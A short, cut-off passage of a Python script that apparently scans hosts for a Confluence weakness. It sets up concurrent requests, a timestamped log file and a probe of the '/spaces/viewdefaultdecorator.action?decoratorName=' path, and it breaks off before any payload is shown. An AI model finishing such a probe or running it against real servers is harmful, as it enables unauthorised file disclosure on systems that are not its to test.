...
import traceback
monkey.patch_all()
logpath = "temp/confluence_"+time.strftime("%Y-%m-%d_%H:%M", time.localtime(time.time())) + ".txt"
import requests


def run(domain,port):
	for suffix in ["/spaces/viewdefaultdecorator.action?decoratorName="]:
		if str(port) == "443":
